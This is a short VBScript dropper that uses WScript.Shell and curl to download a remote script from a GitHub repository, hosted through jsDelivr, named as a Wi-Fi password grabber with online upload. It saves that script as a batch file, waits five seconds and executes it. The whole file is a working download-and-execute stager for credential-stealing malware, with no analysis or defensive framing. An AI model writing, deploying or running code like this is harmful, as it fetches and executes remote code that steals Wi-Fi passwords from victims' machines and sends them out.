Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run "cmd /c curl https://cdn.jsdelivr.net/gh/oceanofanythingofficial/Wi-Fi-Password-Grabber-With-Online-Upload-Facility-With-Ducky-Script-Batch-Script-vbs-Script/Powershell-Script.ps1 -o Batch-Script.bat"
WScript.Sleep(5000)
WinScriptHost.Run Chr(34) & "Batch-Script.bat" 
